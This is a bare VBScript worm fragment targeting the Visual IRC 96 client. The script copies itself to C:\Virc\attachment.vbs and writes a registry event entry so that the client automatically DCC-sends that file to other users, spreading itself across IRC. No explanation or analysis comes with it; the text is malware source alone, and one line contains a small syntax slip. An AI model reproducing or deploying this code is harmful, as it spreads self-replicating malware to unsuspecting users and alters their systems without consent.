set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Virc\attachment.vbs", True
set shell=CreateObject("WScript.Shell")
shell RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\attachment.vbs"